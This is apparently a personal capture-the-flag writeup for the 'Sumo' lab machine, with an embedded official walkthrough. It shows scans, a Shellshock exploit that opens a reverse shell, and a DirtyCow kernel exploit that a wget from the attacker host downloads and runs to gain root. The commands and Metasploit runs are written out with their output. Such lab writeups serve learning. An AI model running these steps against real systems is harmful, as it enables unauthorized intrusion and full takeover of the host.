---
title: Sumo
parent: Proving Grounds Practice
grand_parent: Writeups
nav_order:
---
# Machine
## OS
## Level

---
# Reconnaissance
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Sumo]
└─$ sudo nmap -Pn -p- -sS -oN open-port_scan.txt --open 192.168.189.87                 
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-25 00:11 +0900
Nmap scan report for 192.168.189.87
Host is up (0.082s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 28.75 seconds
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Sumo]
└─$ sudo nmap -Pn -p22,80 -sSCV -A -oN full_tcp-scan.txt --open 192.168.189.87
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-25 00:15 +0900
Nmap scan report for 192.168.189.87
Host is up (0.083s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 06:cb:9e:a3:af:f0:10:48:c4:17:93:4a:2c:45:d9:48 (DSA)
|   2048 b7:c5:42:7b:ba:ae:9b:9b:71:90:e7:47:b4:a4:de:5a (RSA)
|_  256 fa:81:cd:00:2d:52:66:0b:70:fc:b8:40:fa:db:18:30 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   82.61 ms 192.168.45.1
2   82.43 ms 192.168.45.254
3   82.57 ms 192.168.251.1
4   82.75 ms 192.168.189.87

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.57 seconds
```

# HTTP

## 80

```zsh

```

![](../../../assets/images/Pasted%20image%2020260525004805.png)

![](../../../assets/images/Pasted%20image%2020260525004750.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Sumo]
└─$ whatweb -a 3 http://192.168.189.87       
http://192.168.189.87 [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[192.168.189.87] 
```

```zsh

```



---

# Initial Access

https://github.com/b4keSn4ke/CVE-2014-6271

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Sumo]
└─$ git clone https://github.com/b4keSn4ke/CVE-2014-6271                 
Cloning into 'CVE-2014-6271'...
remote: Enumerating objects: 32, done.
remote: Counting objects: 100% (32/32), done.
remote: Compressing objects: 100% (28/28), done.
remote: Total 32 (delta 6), reused 21 (delta 3), pack-reused 0 (from 0)
Receiving objects: 100% (32/32), 1.63 MiB | 22.20 MiB/s, done.
Resolving deltas: 100% (6/6), done.
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Sumo]
└─$ python3 CVE-2014-6271/shellshock.py 192.168.45.224 80 http://192.168.189.87/cgi-bin/test
/home/kali/CTF/OffSec/Practice/Sumo/CVE-2014-6271/shellshock.py:33: SyntaxWarning: invalid escape sequence '\_'
  *  \___ \| '_ \ / _ \ | / __| '_ \ / _ \ / __| |/ / | '_ \| | | |   *
/home/kali/CTF/OffSec/Practice/Sumo/CVE-2014-6271/shellshock.py:50: DeprecationWarning: ssl.PROTOCOL_TLSv1_2 is deprecated
  "TLS Version 1.2": ssl.SSLContext(ssl.PROTOCOL_TLSv1_2),
/home/kali/CTF/OffSec/Practice/Sumo/CVE-2014-6271/shellshock.py:51: DeprecationWarning: ssl.PROTOCOL_TLSv1_1 is deprecated
  "TLS Version 1.1": ssl.SSLContext(ssl.PROTOCOL_TLSv1_1),
/home/kali/CTF/OffSec/Practice/Sumo/CVE-2014-6271/shellshock.py:52: DeprecationWarning: ssl.PROTOCOL_TLSv1 is deprecated
  "TLS Version 1.0": ssl.SSLContext(ssl.PROTOCOL_TLSv1),

*********************************************************************
*   ____  _          _ _     _                _                     *
*  / ___|| |__   ___| | |___| |__   ___   ___| | __  _ __  _   _    *
*  \___ \| '_ \ / _ \ | / __| '_ \ / _ \ / __| |/ / | '_ \| | | |   *
*   ___) | | | |  __/ | \__ \ | | | (_) | (__|   < _| |_) | |_| |   *
*  |____/|_| |_|\___|_|_|___/_| |_|\___/ \___|_|\_(_) .__/ \__, |   *
*                                                   |_|    |___/    *
*                                                                   *
*            +-+-+-+-+-+-+-+ +-+-+ +-+-+-+-+-+-+-+-+-+              *
*            |E|x|p|l|o|i|t| |b|y| |b|4|k|e|S|n|4|k|e|              *
*            +-+-+-+-+-+-+-+ +-+-+ +-+-+-+-+-+-+-+-+-+              *
*                                                                   *
*                                                                   *
*                  https://github.com/b4keSn4ke/                    *
*                                                                   *
*********************************************************************



[+] Protocol detected: HTTP

[+] Setting Payload ...
[+] Sending Payload to http://192.168.189.87/cgi-bin/test ...

[-] Request: timed out received HTTP code 500

[+] Reverse shell from 192.168.189.87 connected to [192.168.45.224:80].

[+] Payload Sent successfully !
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Sumo]
└─$ rlwrap -cAr nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.224] from (UNKNOWN) [192.168.189.87] 46709
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```zsh
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/usr/lib/cgi-bin$ ls
ls
local.txt  test  test.sh
www-data@ubuntu:/usr/lib/cgi-bin$ cat local.txt
cat local.txt

www-data@ubuntu:/usr/lib/cgi-bin$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
3: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:50:56:ab:fa:31 brd ff:ff:ff:ff:ff:ff
    inet 192.168.189.87/24 brd 192.168.189.255 scope global eth0
www-data@ubuntu:/usr/lib/cgi-bin$ 
```
```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```
---

# Privilege Escalation

```zsh
www-data@ubuntu:/usr/lib/cgi-bin$ uname -ar
uname -ar
Linux ubuntu 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
```

```zsh
www-data@ubuntu:/tmp$ wget http://192.168.45.224:8000/33589.c
wget http://192.168.45.224:8000/33589.c
--2026-05-24 09:41:58--  http://192.168.45.224:8000/33589.c
Connecting to 192.168.45.224:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3525 (3.4K) [text/x-csrc]
Saving to: `33589.c'

100%[======================================>] 3,525       --.-K/s   in 0.001s  

2026-05-24 09:41:58 (3.66 MB/s) - `33589.c' saved [3525/3525]
```

```zsh
www-data@ubuntu:/tmp$ export PATH=/usr/lib/gcc/x86_64-linux-gnu/4.6:$PATH
export PATH=/usr/lib/gcc/x86_64-linux-gnu/4.6:$PATH
```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```


<details markdown="1">
<summary>Walkthrough</summary>

```zsh
Walkthrough
Close
Exploitation Guide for Sumo
Summary
This machine is exploited by the ShellShock vulnerability. It is escalated via the DirtyCow local root exploit.

Enumeration
Nmap
We start off by running an nmap scan:

kali@kali:~$ sudo nmap 192.168.120.153
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 08:17 EDT
Nmap scan report for 192.168.120.153
Host is up (0.032s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
Nikto
Running a nikto scan against the website on port 80 shows something very interesting:

kali@kali:~$ nikto -h http://192.168.120.153
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.120.153
+ Target Hostname:    192.168.120.153
+ Target Port:        80
+ Start Time:         2020-08-20 08:18:14 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ Server may leak inodes via ETags, header found with file /, inode: 1706318, size: 177, mtime: Mon May 11 13:55:10 2020
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Uncommon header '93e4r0-cve-2014-6278' found, with contents: true
+ OSVDB-112004: /cgi-bin/test: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ Uncommon header '93e4r0-cve-2014-6271' found, with contents: true
+ OSVDB-112004: /cgi-bin/test.sh: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3092: /cgi-bin/test/test.cgi: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8725 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2020-08-20 08:23:00 (GMT-4) (286 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
This is the important part:

+ OSVDB-112004: /cgi-bin/test.sh: Site appears vulnerable to the 'shellshock' vulnerability
As nikto reports, the website is vulnerable to shellshock.

Exploitation
ShellShock
We can utilize the multi/http/apache_mod_cgi_bash_env_exec Metasploit module to easily exploit this vulnerability:

msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > options

Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   CMD_MAX_LENGTH  2048             yes       CMD max line length
   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER          User-Agent       yes       HTTP header to use
   METHOD          GET              yes       HTTP method to use
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          192.168.120.153  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager
   RPORT           80               yes       The target port (TCP)
   SRVHOST         0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT         8080             yes       The local port to listen on.
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI       /cgi-bin/test    yes       Path to CGI script
   TIMEOUT         5                yes       HTTP read response timeout (seconds)
   URIPATH                          no        The URI to use for this exploit (default is random)
   VHOST                            no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.118.3    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux x86
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit

[*] Started reverse TCP handler on 192.168.118.3:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (980808 bytes) to 192.168.120.153
[*] Meterpreter session 1 opened (192.168.118.3:4444 -> 192.168.120.153:49700) at 2020-08-20 08:05:46 -0400

meterpreter > shell
Process 1243 created.
Channel 1 created.
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/usr/lib/cgi-bin$ cd /tmp
cd /tmp
www-data@ubuntu:/tmp$
Escalation
Local Enumeration
To enumerate the target system, we download and execute the Linux Exploit Suggester script (https://github.com/mzet-/linux-exploit-suggester):

kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.120.153 - - [20/Aug/2020 08:06:45] "GET /linux-exploit-suggester.sh HTTP/1.1" 200 -
www-data@ubuntu:/tmp$ wget http://192.168.118.3/linux-exploit-suggester.sh
wget http://192.168.118.3/linux-exploit-suggester.sh
--2020-08-20 05:06:45--  http://192.168.118.3/linux-exploit-suggester.sh
Connecting to 192.168.118.3:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 83822 (82K) [text/x-sh]
Saving to: `linux-exploit-suggester.sh'

100%[======================================>] 83,822      --.-K/s   in 0.07s   

2020-08-20 05:06:45 (1.09 MB/s) - `linux-exploit-suggester.sh' saved [83822/83822]

www-data@ubuntu:/tmp$ chmod 777 linux-exploit-suggester.sh
chmod 777 linux-exploit-suggester.sh
www-data@ubuntu:/tmp$ ./linux-exploit-suggester.sh
./linux-exploit-suggester.sh

Available information:
Kernel version: 3.2.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 12.04
...
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
...
The scan shows that the system is vulnerable to the DirtyCow root exploit. https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54 contains the C source code file. We can compile it on the attacking machine:

kali@kali:~$ gcc -pthread c0w.c -o c0w
c0w.c: In function ‘main’:
c0w.c:103:3: warning: implicit declaration of function ‘asprintf’; did you mean ‘vsprintf’? [-Wimplicit-function-declaration]
  103 |   asprintf(&backup, "cp %s /tmp/bak", suid_binary);
      |   ^~~~~~~~
      |   vsprintf
c0w.c:104:3: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
  104 |   system(backup);
      |   ^~~~~~

All that is left to do is download and execute the privilege escalation exploit on the target:

kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.120.153 - - [20/Aug/2020 07:59:24] "GET /c0w HTTP/1.1" 200 -
www-data@ubuntu:/tmp$ wget http://192.168.118.3/c0w
wget http://192.168.118.3/c0w -O c0w
--2020-08-20 05:08:05--  http://192.168.118.3/c0w
Connecting to 192.168.118.3:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17904 (17K) [application/octet-stream]
Saving to: `c0w'

100%[======================================>] 17,904      --.-K/s   in 0.04s   

2020-08-20 05:08:05 (461 KB/s) - `c0w' saved [17904/17904]

www-data@ubuntu:/tmp$ chmod 777 c0w
chmod 777 c0w
www-data@ubuntu:/tmp$ ./c0w
./c0w
...
Backing up /usr/bin/passwd to /tmp/bak
mmap ef311000

madvise 0

ptrace 0

www-data@ubuntu:/tmp$ 

www-data@ubuntu:/tmp$ /usr/bin/passwd
/usr/bin/passwd
root@ubuntu:/tmp# whoami
whoami
root
```

</details>